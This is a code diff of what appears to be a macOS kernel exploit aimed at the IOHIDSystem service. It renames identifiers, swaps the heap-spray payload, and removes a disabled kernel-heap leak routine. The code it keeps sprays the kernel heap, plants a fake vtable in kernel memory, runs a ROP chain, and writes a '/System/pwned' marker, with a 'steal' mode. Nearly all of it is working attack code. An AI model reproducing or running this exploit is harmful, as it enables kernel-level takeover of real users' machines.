@@ -35,12 +35,7 @@ extern const unsigned int helper_len;
 #define KERNEL_PATH "/System/Library/Kernels/kernel"
 #define PWNAGE_PATH "/System/pwned"
 
-const uint64_t SET_CURSOR_ENABLED_METHOD_INDEX = 2;
-
-#ifdef IOHIDEOUS_READ /* false */
-const uint64_t REGISTER_DISPLAY_METHOD_INDEX = 7;
-const uint64_t UNREGISTER_DISPLAY_METHOD_INDEX = 8;
-#endif
+const uint64_t IOHID_SET_CURSOR_ENABLED = 2;
 
 // signal handler
 static void ignore(int signo)
@@ -48,10 +43,10 @@ static void ignore(int signo)
     // do nothing
 }
 
-static kern_return_t setCursorEnabled(io_connect_t client, bool enable)
+static kern_return_t set_cursor_enabled(io_connect_t client, bool enable)
 {
     uint64_t arg = enable;
-    kern_return_t ret = IOConnectCallScalarMethod(client, SET_CURSOR_ENABLED_METHOD_INDEX, &arg, 1, NULL, NULL);
+    kern_return_t ret = IOConnectCallScalarMethod(client, IOHID_SET_CURSOR_ENABLED, &arg, 1, NULL, NULL);
     if(ret == kIOReturnNoDevice)
     {
         ret = KERN_SUCCESS;
@@ -240,7 +235,7 @@ int main(int argc, const char **argv)
     LOG("IOHIDSystem service: 0x%x", service);
 
     LOG("Spraying heap...");
-    ret = heap_spray(master, 0, heap_payload_small, heap_payload_small_len, NULL, NULL);
+    ret = heap_spray(master, 0, heap_payload, heap_payload_len, NULL, NULL);
     if(ret != KERN_SUCCESS)
     {
         goto out1;
@@ -284,7 +279,7 @@ int main(int argc, const char **argv)
     LOG("IOHIDUserClient: 0x%x", client);
     if(act == ACT_STEAL)
     {
-        if(setCursorEnabled(client, false) != KERN_SUCCESS)
+        if(set_cursor_enabled(client, false) != KERN_SUCCESS)
         {
             goto out3;
         }
@@ -324,65 +319,6 @@ int main(int argc, const char **argv)
         }
     }
     LOG("Shmem: 0x%016llx-0x%016llx", shmem_addr, shmem_addr + shmem_size);
-
-    // This demonstrates how one could in theory leak data off the kernel heap.
-    // We need to first spray the heap so that we can offset evg without panicking.
-    // Since that overwrites a lot of memory, we need to pick your heap spray carefully.
-    // Once the structure is moved, we need to re-spray the heap in order to get
-    // a useful value into a readable location. For that we use _cursorHelper,
-    // which will be used in initialization and which we can trigger to cache the
-    // shmem value by changing the display bounds of a virtual display.
-    // Since the page size is 0x1000 and the minimum struct size to get out of zalloc
-    // is 3 pages, there is only a 1/3 chance that we will get the offset right.
-    // We only know whether we did so after moving evg back, so if we failed we have to
-    // re-spray the heap and start again, which, on average, takes an eternity.
-
-    // For that reason and because I know of no structures that could be used to leak the slide this way,
-    // this code is disabled by default and the kernel slide is obtained by means of a timing attack.
-#ifdef IOHIDEOUS_READ /* false */
-    LOG("Registering virtual display...");
-    uint64_t screen = 0;
-    uint32_t cnt = 1;
-    ret = IOConnectCallScalarMethod(client, REGISTER_DISPLAY_METHOD_INDEX, NULL, 0, &screen, &cnt);
-    if(ret != KERN_SUCCESS)
-    {
-        ERR("Failed to register virtual display: %s", mach_error_string(ret));
-        goto out3;
-    }
-
-    uint32_t leak = 0;
-    for(int off = 0x1000; leak == 0; off = (off + 0x1000) % rounded_size)
-    {
-        if(leak_uint32_prepare(client, shmem_addr, offset_amount + off) != KERN_SUCCESS)
-        {
-            goto out3;
-        }
-
-        LOG("Re-spraying heap...");
-        ret = heap_spray(master, payload_offset, heap_payload_big, heap_payload_big_len, NULL, NULL);
-        if(ret != KERN_SUCCESS)
-        {
-            shmem_init(client); // Can't leave this in a broken state
-            goto out3;
-        }
-
-        if(leak_uint32(client, shmem_addr, screen, &leak) != KERN_SUCCESS)
-        {
-            goto out3;
-        }
-
-        LOG("0x%x", leak);
-
-        LOG("Resetting heap...");
-        ret = heap_spray(master, payload_offset, heap_payload_small, heap_payload_small_len, NULL, NULL);
-        if(ret != KERN_SUCCESS)
-        {
-            goto out3;
-        }
-    }
-
-    IOConnectCallScalarMethod(client, UNREGISTER_DISPLAY_METHOD_INDEX, &screen, 1, NULL, NULL);
-#endif
 
     LOG("Putting fake vtable in kernel memory...");
     hibernate_statistics_t hib, hib_old;
@@ -795,7 +731,7 @@ do \
     shmem_init(client); // Clean up our ROP chain
     if(act == ACT_STEAL)
     {
-        setCursorEnabled(client, true);
+        set_cursor_enabled(client, true);
         mach_port_deallocate(mach_task_self(), client);
     }
     else
